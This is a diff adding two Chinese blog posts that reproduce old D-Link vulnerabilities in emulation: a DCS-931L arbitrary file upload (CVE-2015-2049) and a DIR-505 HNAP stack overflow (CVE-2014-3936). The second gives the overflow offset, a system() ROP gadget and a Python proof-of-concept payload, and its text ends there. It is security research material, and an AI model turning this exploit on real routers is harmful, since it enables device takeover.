@@ -168,6 +168,234 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/12/CVE-2015-2049%20Dlink%2093XL%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="OneShell">
+      <meta itemprop="description" content="ToT">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="OneShell">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/04/12/CVE-2015-2049%20Dlink%2093XL%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="post-title-link" itemprop="url">CVE-2015-2049 Dlink 93XL任意文件上传</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-04-12 06:21:26 / Modified: 18:34:46" itemprop="dateCreated datePublished" datetime="2023-04-12T06:21:26+08:00">2023-04-12</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/IoT/" itemprop="url" rel="index"><span itemprop="name">IoT</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="CVE-2015-2049-Dlink-93XL-任意文件上传"><a href="#CVE-2015-2049-Dlink-93XL-任意文件上传" class="headerlink" title="CVE-2015-2049 Dlink 93XL 任意文件上传"></a>CVE-2015-2049 Dlink 93XL 任意文件上传</h1><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>CVE-2015-2049 是发生在设备 Dlink 931L 上 1.04 版本的任意文件上传漏洞，漏洞允许通过认证的用户上传一个可执行脚本到指定目录，如果将目录设置到系统目录中，就会覆盖掉原有的系统文件，进而实现代码执行。该固件版本还被用于其他 Dlink 93X 系列 IP 摄像头，因此其他也可能存在此漏洞。</p>
+<p>此次漏洞复现采用的固件是 Dlink 931l 1.04 版本固件，固件下载地址见参考链接。</p>
+<p>存在漏洞的程序依旧是后端服务器 alphapd，通过分析 exploit.db 上的 exp，可以得到大概原理。<br>漏洞函数调用链通过调试如下，大概的流程就是保存文件并通过格式化字符串，然后通过 system 函数更改文件权限为 a+rwx。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">► f 0 0x42b6bc uploadfile+844</span><br><span class="line">  f 1 0x42ce94 websCgibinProcessor+1724</span><br><span class="line">  f 2 0x41573c websUrlProcessRequest+428</span><br><span class="line">  f 3 0x409a34 websReadEvent+920</span><br><span class="line">  f 4 0x40af24 websSocketEvent+140</span><br><span class="line">  f 5 0x4137f4 websSocketEventProcess+680</span><br><span class="line">  f 6 0x406df0 httpd_main+232</span><br><span class="line">  f 7 0x407620 main+772</span><br></pre></td></tr></table></figure>
+
+<p>存在任意文件上传的 uri 是 uploadfile.htm，选择上传文件路径和上传文件，点击 Upload File，会调用 setFileUpload。如下是上传文件并保存到 &#x2F;tmp&#x2F;test.sh 中。<br><img src="/images/image-2023-0412-182227290.png" alt="undifined"><br><img src="/images/image-2023-0412-182245226.png" alt="undifined"><br><img src="/images/image-2023-0412-182307962.png" alt="undifined"></p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>在 main 函数中可以根据初始化流程来手动创建一些启动需要的文件。初始化流程是：读取相关 pid 文件、解析 SSL Key、从 nvram 中读取 IPAddress、最后根据 IP 和 port 启动 http 服务。SSL Key 解析不是非必要的，用 QEMU 模拟的时候如果报错可以忽略。</p>
+<p>那么首先手动创建相关的 pid 文件：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mkdir ./var/run</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建 alphapd pid 文件</span></span><br><span class="line">touch ./var/run/alphapd.pid</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建 nvramd pid 文件</span></span><br><span class="line">touch ./var/run/nvramd.pid</span><br></pre></td></tr></table></figure>
+
+<p>然后根据 websStartupServer 启动流程，IP 地址是先从 getSysInfoLong 函数中获取，该函数通过读取 &#x2F;dev&#x2F;gpio 设备，仿真条件下没有该设备，读取会失败无法执行。那么手动对函数流程进行 patch，执行完 getSysInfoLong 后 v3 &#x3D; 0，然后跳转到 inet_ntoa 处执行，就会解析处 IP 地址为 0.0.0.0，然后在本地启动。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">websStartupServer</span><span class="params">(<span class="type">int</span> a1)</span> &#123;</span><br><span class="line">  ...</span><br><span class="line">  v3 = getSysInfoLong(<span class="number">30</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v3</span><br><span class="line">    &amp;&amp; (v4 = (<span class="type">const</span> <span class="type">char</span> *)nvram_bufget(<span class="number">0</span>, <span class="string">&quot;IPAddress&quot;</span>),</span><br><span class="line">        trace(<span class="number">0</span>, <span class="string">&quot;Can&#x27;t get lan ip from sysinfo!\n&quot;</span>),</span><br><span class="line">        v3 = inet_addr(v4),</span><br><span class="line">        v3 == <span class="number">-1</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    trace(<span class="number">0</span>, <span class="string">&quot;failed to convert %s to binary ip data&quot;</span>, v4);</span><br><span class="line">    result = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v5 = inet_ntoa(v3);</span><br><span class="line">    ...</span><br><span class="line">    result = websOpenListen(a1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>patch 如下：<br><img src="/images/image-2023-0412-182345533.png" alt="undifined"><br>服务启动成功：<br><img src="/images/image-2023-0412-182404037.png" alt="undifined"><br><img src="/images/image-2023-0412-182420441.png" alt="undifined"></p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>然后最终的调试还是在 qemu-system-mipsel 搭建的 debian 虚拟机中进行的，原因如下：</p>
+<ol>
+<li><p>qemu-mipsel-static 的调试不能进入子进程追踪，设置了 set follow-fork-mode child 也不行</p>
+</li>
+<li><p>qemu-mipsel-static 搭建的 server 上传的文件属性无可执行，如下是使用 kali 搭建的 server 上传文件后的属性</p>
+</li>
+</ol>
+<p><img src="/images/image-2023-0412-182500484.png" alt="undifined"><br>漏洞复现没有什么可说的了，前面已经在漏洞分析过程使用 burpsuite 抓包然后上传文件，调试使用重放就行。<br>感兴趣的话可以看看 MSF 里面是如何利用该漏洞的，思路就是使用文件上传覆盖掉一些可开机自启的文件，然后实现命令执行。</p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>漏洞原理简单，搭建环境简单，没有什么难度。</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/39192">[exploit-db] D-Link DCS-931L - Arbitrary File Upload (Metasploit)</a></li>
+<li><a target="_blank" rel="noopener" href="https://d3.driverscollection.com/-46693313106bb356827d84470ae/6e6dedeb53d2/4ea7d0b7ae412e6088176bf03682fbecc8d32328aec157addbf041def1c8cc4f801f760acb605007e45f6cb1213c1a2a618e14a1/4/48/41/1414948882/DCS-931L_FIRMWARE_1.04B1.ZIP">[固件下载] dlink 931l 1.04</a></li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/12/CVE-2014-3936%20Dlink%20505%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="OneShell">
+      <meta itemprop="description" content="ToT">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="OneShell">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/04/12/CVE-2014-3936%20Dlink%20505%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/" class="post-title-link" itemprop="url">CVE-2014-3936 Dlink 505缓冲区溢出</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-04-12 06:10:30 / Modified: 18:19:33" itemprop="dateCreated datePublished" datetime="2023-04-12T06:10:30+08:00">2023-04-12</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/IoT/" itemprop="url" rel="index"><span itemprop="name">IoT</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="CVE-2014-3936-dir-505-数组越界缓冲区溢出"><a href="#CVE-2014-3936-dir-505-数组越界缓冲区溢出" class="headerlink" title="CVE-2014-3936 dir-505 数组越界缓冲区溢出"></a>CVE-2014-3936 dir-505 数组越界缓冲区溢出</h1><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>CVE-2014-3936 是发生在 dlink 旗下路由器 dir-505 的缓冲区溢出漏洞，漏洞存在于固件版本 1.07 及以前的 HNAP 处理程序中，漏洞发生在 HNAP 处理请求的时候，将 CONTENT_LENGTH 大小的数据直接复制到了缓冲区中，如果 CONTENT_LENGTH 大小超过了缓冲区大小，就会导致缓冲区溢出，进而实现代码执行。总之，是一个数组越界导致缓冲区溢出的漏洞。</p>
+<p>此次漏洞分析采用的是 dir-505 固件版本 1.07，漏洞下载地址见参考链接。通过分析固件的文件系统，可以知道服务器采用的是 lighttpd 作为后端，lighttpd 也是嵌入式设备经常使用的一个小型 http server。发生漏洞的程序是 .&#x2F;usr&#x2F;bin&#x2F;my_cgi.cgi，使用的是 fastcgi 调用过程，当收到 uri 为 HNAP1 的数据包时，会将数据包通过环境变量和标准输入 STDIN 传给 my_cgi.cgi 进行处理。</p>
+<p>漏洞发生的位置是在 main -&gt; do_hnap 函数中，do_hnap 函数在从环境变量中读取数据的时候，先读取数据包长度 CONTENT_LENGTH，然后根据其大小，通过一个循环，从标准输入中每次读取一个字节放在函数栈上的缓冲区中。如果 CONTENT_LENGTH 过大，就会导致缓冲区溢出，实际上就是数据包的数据够多，就会发生缓冲区溢出。IDA 中反编译的关键流程如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">do_hnap</span><span class="params">()</span> </span><br><span class="line">&#123;  </span><br><span class="line">  dec_content_length = <span class="number">0</span>;</span><br><span class="line">  content_length = getenv(<span class="string">&quot;CONTENT_LENGTH&quot;</span>);	<span class="comment">// 从环境变量获取 CONTENT_LENGTH</span></span><br><span class="line">  <span class="keyword">if</span> ( content_length )</span><br><span class="line">    dec_content_length = strtol(content_length, <span class="number">0</span>, <span class="number">10</span>); <span class="comment">// 将 CONTENT_LENGTH 转化为 10 进制</span></span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">if</span> ( dec_content_length &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    loop_pointer = v12;                         <span class="comment">// 指向 buf 的起始位置</span></span><br><span class="line">    end_of_buf = &amp;v12[dec_content_length];      <span class="comment">// 指向 buf 的结束位置</span></span><br><span class="line">    <span class="built_in">memset</span>(v12, <span class="number">0</span>, <span class="keyword">sizeof</span>(v12));                <span class="comment">// 对 buf 清零</span></span><br><span class="line">    <span class="keyword">while</span> ( <span class="built_in">stdin</span>-&gt;_fileno )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = <span class="built_in">stdin</span>-&gt;_IO_write_base;</span><br><span class="line">      <span class="keyword">if</span> ( v6 &gt;= <span class="built_in">stdin</span>-&gt;_IO_write_end )</span><br><span class="line">      &#123;</span><br><span class="line">        v8 = (<span class="type">int</span> (**)(FILE *))&amp;_fgetc_unlocked;<span class="comment">// v8 实际上是一个函数指针</span></span><br><span class="line">LABEL_21:</span><br><span class="line">        v7 = ((<span class="type">int</span> (*)(<span class="type">void</span>))v8)();             <span class="comment">// 调用 fgetc</span></span><br><span class="line">        <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">      &#125;</span><br><span class="line">      v7 = *v6;</span><br><span class="line">      <span class="built_in">stdin</span>-&gt;_IO_write_base = v6 + <span class="number">1</span>;</span><br><span class="line">LABEL_22:</span><br><span class="line">      *loop_pointer++ = v7;                     <span class="comment">// 将 fgetc 读取到的字符写入到 buf</span></span><br><span class="line">      <span class="keyword">if</span> ( loop_pointer == end_of_buf )			<span class="comment">// 结束从 STDIN 中读取</span></span><br><span class="line">      &#123;</span><br><span class="line">        ...</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v8 = &amp;fgetc;</span><br></pre></td></tr></table></figure>
+
+<p>在 do_hnap 函数中，函数执行完毕后的返回地址在初始化堆栈的时候存放在 sp + 0x7574，缓冲区的起始地址是 sp + 0x30，那么一共需要 30020 个字节使缓冲区溢出，再额外溢出 4 个字节就可以修改保存再堆上的返回地址，最后 do_hnap 函数执行完毕将返回地址从栈中取出到 ra 寄存器然后跳转，就可以达到劫持控制流的目的。缓冲区的起始地址可以从 IDA 直接反编译得到。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:00430DBC sw      $ra, 0x7560+var_s14($sp)	# 保存返回地址到栈上</span><br><span class="line">...</span><br><span class="line">.text:00431168 lw      $ra, 0x7574($sp)	# 从栈上恢复返回地址跳转执行</span><br><span class="line">...</span><br><span class="line">.text:00431184 jr      $ra</span><br><span class="line">.text:00431188 addiu   $sp, 0x7578</span><br></pre></td></tr></table></figure>
+
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>后端的 server 是 lighttpd，一开始没有在固件根目录下面找到 html 文件，在 cq 师傅的提醒下，先分析系统的启动脚本 .&#x2F;etc&#x2F;rc.d&#x2F;rcS。在启动脚本中，挂载一些设备和创建相关目录，然后是系统初始化程序 system_manager 运行，在其中也会通过 system 函数执行一些命令。如下是系统初始化脚本。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/ash</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">This script runs when init it run during the boot process.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Mounts everything <span class="keyword">in</span> the fstab</span></span><br><span class="line">mount -a</span><br><span class="line">mount -o remount +w /</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Mount the RAM filesystem to /tmp</span></span><br><span class="line">mount -t tmpfs tmpfs /tmp</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">此处会覆盖掉原来的 etc 目录</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">copy all files <span class="keyword">in</span> the mnt folder to the etc folder</span></span><br><span class="line">cp -a /mnt/* /etc</span><br><span class="line"></span><br><span class="line">ln -sf /etc/hotplug/hotplug /sbin/hotplug</span><br><span class="line"></span><br><span class="line">mkdir -p /var/etc</span><br><span class="line">mkdir -p /var/firm</span><br><span class="line">mkdir -p /var/log</span><br><span class="line">mkdir -p /var/misc</span><br><span class="line">mkdir -p /var/run</span><br><span class="line">mkdir -p /var/sbin</span><br><span class="line">mkdir -p /var/tmp</span><br><span class="line">mkdir -p /tmp/var</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">系统初始化程序</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">/bin/echo <span class="string">&quot;Init System...&quot;</span></span></span><br><span class="line">system_manager &amp;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">/bin/echo <span class="string">&quot;Start tftpd...&quot;</span></span></span><br><span class="line">tftpd &amp;</span><br></pre></td></tr></table></figure>
+
+<p>将系统初始化程序 system_manager 放入 IDA 分析，在 main -&gt; init_system -&gt; init_web_server -&gt; init_html_files 中可以看到是如何将原本存放在 mnt 目录下的 html 文件解压出来的，那我们在启动 lighttpd 之前就可以手动执行相关的命令，将 html 文件准备好。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">init_html_files</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  system(<span class="string">&quot;tar -zxf /etc/www.tgz&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;rm -f /etc/www.tgz&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !byte_416321 )</span><br><span class="line">    system(<span class="string">&quot;mv /www/ap/* /www&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;rm -rf /www/ap&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( byte_416321 == <span class="number">2</span> )</span><br><span class="line">    system(<span class="string">&quot;mv /www/rt/* /www&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;rm -rf /www/rt&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( byte_416321 == <span class="number">3</span> )</span><br><span class="line">    system(<span class="string">&quot;mv /www/rpt/* /www&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;rm -rf /www/rpt&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( byte_416321 == <span class="number">4</span> )</span><br><span class="line">    system(<span class="string">&quot;mv /www/whp/* /www&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;rm -rf /www/whp&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;cp -f /usr/bin/my_cgi.cgi /www&quot;</span>);</span><br><span class="line">  copy_default_xml();</span><br><span class="line">  <span class="keyword">return</span> read_lang_from_flash();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最后是看 system_manager 是如何启动 lighttpd 的，可以在 IDA 中直接搜索字符串 lighttpd，定位到 init_web_server 函数中，然后分析 system 函数传入的参数，就可以得到 lighttpd 的启动命令 <code>lighttpd -f /etc/lighttpd/lighttpd.conf </code>。此处如果直接 F5 的话，分析得到的 system 传入命令不完整。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00403</span>C00 addiu   $a0, (aLighttpdFS - <span class="number">0x400000</span>)  # <span class="string">&quot;lighttpd -f %s &amp;&quot;</span></span><br><span class="line">.text:<span class="number">00403</span>C04 addiu   $a1, (aEtcLighttpdLig_0 - <span class="number">0x400000</span>)  # <span class="string">&quot;/etc/lighttpd/lighttpd.conf&quot;</span></span><br><span class="line">.text:<span class="number">00403</span>C08 jr      $t9 ; _system</span><br><span class="line">.text:<span class="number">00403</span>C0C addiu   $sp, <span class="number">0x20</span></span><br></pre></td></tr></table></figure>
+
+<p>以上是分析工作，实际上真正启动服务器，可以先直接执行启动脚本 .&#x2F;etc&#x2F;rc.d&#x2F;rcS，执行完之后，.&#x2F;etc 目录被原本 .&#x2F;mnt 中的文件替代了，html 文件被解压出来放在了 .&#x2F;www 文件夹中。运行如下命令，就可以启动 http 服务了。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进入固件根目录</span></span><br><span class="line">chroot . ./etc/rc.d/rcS</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">再执行一遍 system_manager 这个地方会卡住 因为有些 /dev 没有被挂载，例如 nvram</span></span><br><span class="line">chroot . ./usr/bin/system_manager</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动 lighttpd，-D 不进入后台运行</span></span><br><span class="line">chroot . ./usr/bin/lighttpd -f ./etc/lighttpd/lighttpd.conf -D</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-2023-0412-181348580.png" alt="undifined"></p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>上述的环境搭建其实是不完善的，例如登录操作这种需要 nvram 的根本执行不了，好在这次漏洞是一个无需认证的漏洞。我没有找到在 lighttpd 中是怎么调用的 my_cgi.cgi，那就直接调试 cgi，通过环境变量传入数据进行调试。</p>
+<p>幸运的是，可以直接使用 QEMU 进行调试这个漏洞，漏洞的触发过程也不涉及到额外的 patch 工作。首先分析如何才能使代码执行到 do_hnap 函数中存在漏洞的代码处。在 main 函数中，需要设置环境变量 SCRIPT_NAME &#x3D; HNAP1，使之进入 do_hnap 函数，然后设置环境变量 SOAP_ACTION !&#x3D; (Reboot | SetRouterLanSettings | SetWLanRadioSecurity | SetWLanRadioSettings)，也就是不等于以上四者。最后设置环境变量 CONTENT_LENGTH 控制从标准输入读入到缓冲区的字节数目。</p>
+<p>触发漏洞的调试脚本如下，补充说明一下需要将 qemu-mips-static 程序复制到固件的根目录下，这样 chroot 的时候才可以正确使用 qemu-mips-static 进行调试。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sudo ./debug_mycgi.sh</span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> SCRIPT_NAME=<span class="string">&quot;HNAP1&quot;</span></span><br><span class="line"><span class="built_in">export</span> SOAP_ACTION=<span class="string">&quot;soap&quot;</span></span><br><span class="line"><span class="built_in">export</span> CONTENT_LENGTH=<span class="string">&quot;30028&quot;</span></span><br><span class="line"></span><br><span class="line">STDIN=`python -c <span class="string">&quot;print &#x27;A&#x27;*30020 + &#x27;deadbeef&#x27;&quot;</span>`</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$STDIN</span>&quot;</span> | <span class="built_in">chroot</span> . ./qemu-mips-static -g 12345 ./usr/bin/my_cgi.cgi</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-2023-0412-181411810.png" alt="undifined"></p>
+<p>路由器上的程序安全措施通常非常简单，没有 NX 也没有 PIE，此处就直接使用 ret2syscall 来达到命令执行的操作，在 IDA 中使用 mipsrop 插件搜索合适的 gadget，决定使用 0x00405C5C 处。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:00405C5C la      $t9, system</span><br><span class="line">.text:00405C60 li      $s1, loc_430000</span><br><span class="line">.text:00405C64 jalr    $t9 ; system</span><br><span class="line">.text:00405C68 addiu   $a0, $sp, 0x64+var_3C  # command</span><br></pre></td></tr></table></figure>
+
+<p>当劫持了控制流执行到 gadget，堆栈已经从 do_hnap 函数中恢复了平衡，通过计算，system 函数执行的命令保存在相对于 buf 30064 个字节处，总结就是：buf 写入 30020 个字节之后可以覆盖返回地址到 gadget 0x00405c5c，再写入 40 个字节可以写入 system 函数执行的命令，那么先用 python 脚本写入一个 stdin 文件，然后在调试脚本中通过 cat 输出文件内容，通过管道传递给 qemu</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python poc.py</span></span><br><span class="line">cmd = <span class="string">b&#x27;touch test\x00&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./stdin&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    poc = <span class="number">30020</span> * <span class="string">b&#x27;A&#x27;</span> + <span class="string">b&#x27;\x00\x40\x5c\x5c&#x27;</span> + <span class="number">40</span> * <span class="string">b&#x27;B&#x27;</span> + cmd</span><br><span class="line">    f.write(poc)</span><br></pre></td></tr></table></figure>
+
